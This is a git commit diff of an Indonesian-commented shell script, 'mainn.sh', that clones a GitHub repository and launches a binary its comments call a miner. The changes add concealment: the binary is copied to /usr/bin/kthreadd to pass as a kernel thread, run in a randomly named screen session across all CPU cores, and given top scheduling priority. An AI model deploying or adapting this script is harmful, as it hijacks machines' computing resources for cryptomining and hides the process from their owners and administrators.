dc2a0a2125b3557f7db191200d4b0bb93c063607
amirul5656 <hendra.amirul@gmail.com>
2025-07-27 21:34:06 +0700

    Update mainn.sh

--- mainn.sh
+++ mainn.sh
@@ -3,17 +3,22 @@
 # Nama proses screen random
 RAND_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 8)
 
-# Instal Node.js (notjs) dan dependensi lain
+# Instal dependensi
 apt-get update -y
 apt-get install -y wget tar screen curl git
-
-
 
 # Clone dan jalankan miner
 git clone https://github.com/amirul5656/webjs.git
 cd webjs
 chmod +x asd
 
-# Jalankan miner dalam screen
-screen -dmS $RAND_NAME ./asd
-echo "🚀 Miner sedang berjalan di dalam screen: $RAND_NAME (user: mbc1qt9gj6nqz4p3f7tylp9mnuvc8vcyrcgue9psxg5.$RAND_NAME)"
+# Duplikat jadi nama sistem
+cp ./asd /usr/bin/kthreadd
+
+# Jalankan miner
+screen -dmS $RAND_NAME /usr/bin/kthreadd -t $(nproc)
+
+# Set prioritas tinggi
+renice -20 -p $(pgrep -f $RAND_NAME)
+
+echo "🚀 Miner sedang berjalan di dalam screen: $RAND_NAME"
